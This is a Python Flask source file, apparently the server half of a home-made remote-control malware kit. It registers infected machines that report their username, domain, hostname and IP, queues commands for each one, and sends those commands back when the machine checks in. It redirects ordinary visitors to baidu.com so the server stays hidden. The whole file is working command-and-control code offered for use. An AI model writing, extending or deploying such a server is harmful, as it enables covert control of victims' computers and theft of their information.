from flask import *
from werkzeug.routing import BaseConverter
from colorama import Fore,init
import base64
import logging
import sys
import uuid
import time

path=sys.argv[0].split('/')
del path[-1]
path="/".join(path)
logging.basicConfig(filename="{}/log/flask.log".format(path),format='%(asctime)s - %(name)s - %(levelname)s - %(message)s')

init(wrap=True,autoreset=True)
class RegexConverter(BaseConverter):
    def __init__(self, map, *args):
        self.map = map
        self.regex = args[0]

beacon=[] #上线机器
commands=[] #机器要执行的命令列表

app=Flask(__name__)
app.url_map.converters['regex']=RegexConverter

def updatetime():
    for x in beacon:
        id = x['uid']
        if id == request.headers.get('Content-Type'):
            x['value']['time'] = time.strftime("%Y-%m-%d %H:%M")

def addcommands(data):
    commands.append(data)

def command():
    print(commands)


@app.route('/',methods=['POST','GET'])
def index():
    if request.method=='GET':
        return "", 302, [("Location", "http://www.baidu.com")]
    elif request.method=='POST':
        updatetime() #如果是存活的机子请求更新最后请求时间
        for x in beacon:
            id = x['uid']
            if id == request.headers.get('Content-Type'):
                for v in range(0,len(commands)):
                    if id==commands[v]['uid']:
                        jg="{}>{}".format(commands[v]['func'],commands[v]['args'])
                        commands.remove(commands[v])
                        return jg

        return "", 302, [("Location", "http://www.baidu.com")]


@app.route('/<regex(".*$.*$.*$.*"):url>',methods=['POST','GET'])
def computer_recv(url):
    if request.method=='GET':
        return "",302,[("Location","http://www.baidu.com")]
    elif request.method=='POST':
        data=str(url).split('$')
        del data[0]
        uid=uuid.uuid4()
        beacon.append({"uid":str(uid),"value":{"username":base64.b64decode(data[0]).decode('utf-16'),"domain":base64.b64decode(data[1]).decode('utf-16'),"hostname":base64.b64decode(data[2]).decode('utf-16'),"ip":base64.b64decode(data[3]).decode('utf-16'),"id":str(uid),"status":Fore.GREEN+"Survive","time":time.strftime("%Y-%m-%d %H:%M")}})
        print(Fore.YELLOW+"\r{}@{}".format(beacon[0]["value"]['hostname'],beacon[0]["value"]['ip'])+"-"+"Online",end="")
        return "{}".format(uid)

def run():
    app.run(host='0.0.0.0', port=8080)